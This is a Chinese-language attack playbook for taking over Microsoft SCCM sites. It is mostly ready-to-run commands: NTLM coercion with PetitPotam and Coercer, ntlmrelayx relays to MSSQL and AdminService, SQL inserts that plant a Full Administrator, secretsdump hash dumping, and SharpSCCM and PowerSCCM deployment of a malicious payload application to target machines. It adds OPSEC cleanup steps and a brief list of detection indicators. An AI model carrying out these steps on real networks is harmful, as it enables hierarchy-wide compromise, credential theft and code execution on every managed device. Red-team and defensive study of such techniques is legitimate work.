# SCCM 站点接管与横向移动攻击链

## Relay 到 MSSQL Site Database

### 攻击概述

站点服务器机器账号对 Site Database 拥有 sysadmin 权限。通过 relay 站点服务器的 NTLM 认证到 MSSQL，可以直接操作数据库注入 SCCM 管理员。

### 完整攻击流程

**步骤 1: 获取目标用户 SID**

```bash
# 通过 LDAP 查询用户 SID
pywerview get-netuser -u $USER -p $PASSWORD -d $DOMAIN --dc-ip $DC_IP \
  --username $TARGET_USER --attributes objectSid
```

```powershell
# PowerShell
(New-Object System.Security.Principal.NTAccount("$DOMAIN\$USER")).Translate(
  [System.Security.Principal.SecurityIdentifier]).Value
```

**步骤 2: 启动 MSSQL Relay**

```bash
ntlmrelayx.py -t "mssql://$SITE_DB" -smb2support -socks
```

**步骤 3: 触发站点服务器认证**

使用任意强制认证方法 (PetitPotam, PrinterBug, DFSCoerce 等) 强制站点服务器向攻击者发起认证:

```bash
# PetitPotam
PetitPotam.py $ATTACKER_IP $SITE_SERVER

# Coercer
coercer coerce -u $USER -p $PASSWORD -d $DOMAIN \
  -l $ATTACKER_IP -t $SITE_SERVER
```

**步骤 4: 通过 SOCKS 连接 SQL**

```bash
proxychains mssqlclient.py "$DOMAIN/$SITE_SERVER$"@"$SITE_DB" -windows-auth
```

**步骤 5: SQL 注入管理员**

```sql
USE CM_$SITE_CODE;

-- 插入管理员记录
INSERT INTO RBAC_Admins (AdminSID, LogonName, DisplayName, IsGroup, IsDeleted,
  CreatedBy, CreatedDate, ModifiedBy, ModifiedDate, SourceSite)
VALUES ($ADMIN_SID, '$DOMAIN\$USER', '$DOMAIN\$USER',
  0, 0, '', '', '', '', '$SITE_CODE');

-- 查询插入的 AdminID
SELECT AdminID FROM RBAC_Admins WHERE LogonName = '$DOMAIN\$USER';

-- 授予 Full Administrator 权限 (RoleID = SMS0001R)
-- ScopeID SMS00ALL = All Scope, ScopeTypeID 29 = All Instances
INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID)
VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = '$DOMAIN\$USER'),
  'SMS0001R', 'SMS00ALL', 29);

-- All Systems 集合
INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID)
VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = '$DOMAIN\$USER'),
  'SMS0001R', 'SMS00001', 1);

-- All Users and Groups 集合
INSERT INTO RBAC_ExtendedPermissions (AdminID, RoleID, ScopeID, ScopeTypeID)
VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = '$DOMAIN\$USER'),
  'SMS0001R', 'SMS00004', 1);
```

**原理**: SCCM RBAC 存储在 Site Database 的 `RBAC_Admins` 和 `RBAC_ExtendedPermissions` 表中。直接操作这些表等同于通过 ConfigMgr 控制台添加管理员。`SMS0001R` 为 "Full Administrator" 角色 ID。

---

## Relay 到 AdminService HTTP API

### 攻击概述

SMS Provider 的 AdminService REST API 支持管理员管理操作。通过 relay 到此端点可直接添加 SCCM 管理员。

```bash
ntlmrelayx.py -t "https://$SMS_PROVIDER/AdminService/wmi/SMS_Admin" \
  -smb2support --adminservice \
  --logonname "$DOMAIN\\$USER" \
  --displayname "$DOMAIN\\$USER" \
  --objectsid $OBJECTSID
```

触发强制认证后，ntlmrelayx 使用 relay 的凭据向 AdminService 发送 POST 请求，创建新的管理员账号。

**原理**: AdminService 是 SMS Provider 的 REST API，提供与 WMI 同等的管理能力。`SMS_Admin` 类的 POST 操作等同于在控制台添加管理员。

> **限制**: ConfigMgr 2509+ 默认在 AdminService 上拒绝 NTLM 认证，此技术仅适用于早期版本。

---

## Passive → Active 站点服务器 Relay

### 攻击概述

在高可用配置中，passive 站点服务器对 active 站点服务器有特殊信任关系。relay passive 服务器的认证到 active 服务器可获取其凭据。

### 完整攻击流程

**步骤 1: 启动 SMB Relay**

```bash
ntlmrelayx.py -t $ACTIVE_SERVER -smb2support -socks
```

**步骤 2: 触发 Passive 服务器认证**

```bash
PetitPotam.py $ATTACKER_IP $PASSIVE_SERVER
```

**步骤 3: 通过 SOCKS Dump Hash**

```bash
proxychains4 secretsdump.py "$DOMAIN/$PASSIVE_SERVER\$"@"$ACTIVE_SERVER"
```

**步骤 4: 以 Active 站点服务器身份接管**

```bash
sccmhunter.py admin -u "$ACTIVE_SERVER\$" -p "$LMHASH:$NTHASH" \
  -ip $SMS_PROVIDER_IP

# 在 admin 会话中添加管理员
add_admin $DOMAIN\\$USER $ADMIN_SID
```

---

## 应用部署横向移动

### SharpSCCM exec

需要 SCCM 管理员权限。通过创建恶意应用并部署到目标执行命令。

```powershell
# 按资源 ID 执行
SharpSCCM.exe exec -rid $RESOURCE_ID -r $TARGET

# 指定设备名称
SharpSCCM.exe exec -d $TARGET_NAME -r $TARGET
```

### PowerSCCM 完整工作流

```powershell
# 1. 发现站点代码
Find-SccmSiteCode -ComputerName $SITE_SERVER

# 2. 建立管理会话
$session = New-SccmSession -ComputerName $SITE_SERVER \
  -SiteCode $SITE_CODE -Credential $CRED

# 3. 创建恶意应用
New-SccmApplication -Session $session -ApplicationName "evilApp" \
  -PowerShellB64 $ENCODED_PAYLOAD

# 4. 部署到目标集合
New-SccmApplicationDeployment -Session $session \
  -ApplicationName "evilApp" -AssignmentName "deploy" \
  -CollectionName "target_collection"

# 5. 强制客户端检入 (加速执行)
Invoke-SCCMDeviceCheckin -Session $session \
  -CollectionName "target_collection"
```

### CMScript 替代方案

```powershell
# 通过 CMScript 功能执行 PowerShell 脚本
New-CMScriptDeployement -CMDrive 'E' -ServerFQDN '$SITE_SERVER' \
  -TargetDevice '$TARGET' -Path '.\payload.ps1' -ScriptName 'evilScript'
```

### AdminService API 交互

```bash
# sccmhunter 管理控制台
sccmhunter.py admin -u "$USER" -p "$PASSWORD" -ip "$SITE_SERVER_IP"
```

在 admin 会话中可用命令:

| 命令 | 说明 |
|------|------|
| `help` | 显示可用命令 |
| `interact $RESOURCE_ID` | 与指定设备交互 |
| `ps` | 列出进程 |
| `ls $PATH` | 列出目录 |
| `cat $FILE` | 读取文件 |
| `exec $COMMAND` | 执行命令 |
| `add_admin $USER $SID` | 添加 SCCM 管理员 |
| `remove_admin $USER` | 移除管理员 |
| `get_user $USER` | 查询用户信息 |
| `get_device $DEVICE` | 查询设备信息 |

---

## 层级接管 (Hierarchy Takeover)

### CAS 自动传播

在多站点 SCCM 环境中 (CAS + 多个 Primary)，管理员记录会在站点间自动复制同步。

```
CAS (Central Administration Site)
 ├─ Primary Site A  ←  在此添加管理员
 ├─ Primary Site B  ←  自动同步
 └─ Primary Site C  ←  自动同步
```

**利用方式**: 在任一 Primary 站点通过上述任意方法添加管理员后，等待站点复制周期 (通常几分钟到几小时)，管理员权限会自动传播到 CAS 及所有子站点。

```bash
# 在 sccmhunter admin 会话中添加管理员
add_admin $DOMAIN\\$USER $ADMIN_SID

# 验证传播 (在其他站点)
sccmhunter.py admin -u "$USER" -p "$PASSWORD" -ip "$OTHER_SITE_IP"
```

### TAKEOVER-5: 跨站点 AdminService Relay

在多站点环境中，relay 任意站点服务器的认证到另一站点的 SMS Provider。

```bash
# relay 到远程站点的 AdminService
ntlmrelayx.py -t "https://$REMOTE_SMS_PROVIDER/AdminService/wmi/SMS_Admin" \
  -smb2support --adminservice \
  --logonname "$DOMAIN\\$USER" \
  --displayname "$DOMAIN\\$USER" \
  --objectsid $OBJECTSID
```

> **限制**: 仅适用于 ConfigMgr v2509 之前的版本。

---

## OPSEC 注意事项

### ConfigMgr 2509+ 安全增强

- AdminService 默认拒绝 NTLM 认证
- 需使用 Kerberos 或 MSSQL 路径绕过
- MSSQL relay 路径不受此限制

### 清理建议

```sql
-- 移除注入的管理员 (MSSQL)
DELETE FROM RBAC_ExtendedPermissions WHERE AdminID = (
  SELECT AdminID FROM RBAC_Admins WHERE LogonName = '$DOMAIN\$USER'
);
DELETE FROM RBAC_Admins WHERE LogonName = '$DOMAIN\$USER';
```

```bash
# sccmhunter 移除管理员
remove_admin $DOMAIN\\$USER
```

### 检测指标

| 指标 | 说明 |
|------|------|
| RBAC_Admins 表异常插入 | SQL 审计日志 |
| AdminService POST SMS_Admin | IIS 日志 / HTTP 审计 |
| 异常应用部署 | SCCM 状态消息 |
| Client Push 到非预期目标 | SCCM 组件日志 |
| 新设备注册突增 | MP 日志 (`MP_RegistrationManager.log`) |

### 攻击路径选择

```
目标: 获取 SCCM 管理员
    │
    ├─ 首选: MSSQL relay (适用范围最广)
    │   └─ 需要: 可触发站点服务器 NTLM + MSSQL 不要求签名
    │
    ├─ 次选: AdminService relay (操作简单)
    │   └─ 限制: ConfigMgr 2509+ 不可用
    │
    ├─ 备选: Passive → Active relay
    │   └─ 需要: 高可用配置环境
    │
    └─ 最后: Client Push relay
        └─ 需要: 已启用自动客户端推送
```
